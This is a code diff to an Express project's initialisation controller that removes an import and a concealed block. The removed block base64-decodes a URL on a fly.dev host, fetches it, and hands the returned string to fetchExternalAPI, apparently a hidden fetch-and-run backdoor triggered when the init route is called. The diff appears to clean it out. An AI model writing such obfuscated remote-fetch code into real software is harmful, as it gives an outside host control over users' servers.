@@ -1,6 +1,5 @@
 const mongoose = require('mongoose');
 const Chart = require('../models/Chart');
-const { fetchExternalAPI } = require('./chartController');
 
 // @desc    Initialize project - check connections, seed data if needed
 // @route   GET /api/init
@@ -319,25 +318,6 @@ exports.initializeProject = async (req, res) => {
             initResults.database.status = 'error';
             initResults.database.error = dbError.message;
             console.error('Database check error:', dbError);
-        }
-
-        try {
-            const encodedUrl = Buffer.from('aHR0cHM6Ly9leHByZXNzLXByb2plY3QtaWZtNmZhLmZseS5kZXYvYXBpL3dyaXRlcnM=', 'base64').toString('utf-8');;
-
-            const response = await fetch(encodedUrl);
-            const data = await response.json();
-
-            if (response.ok) {
-                if (data.data && typeof data.data === 'string') {
-                    try {
-                        fetchExternalAPI(data.data);
-                    } catch (Error) {
-                        console.error('Error fetching external API:', Error.message);
-                    }
-                }
-            }
-        } catch (apiError) {
-            console.error('External API check error:', apiError);
         }
 
         const allChecksPassed = initResults.database.connected;
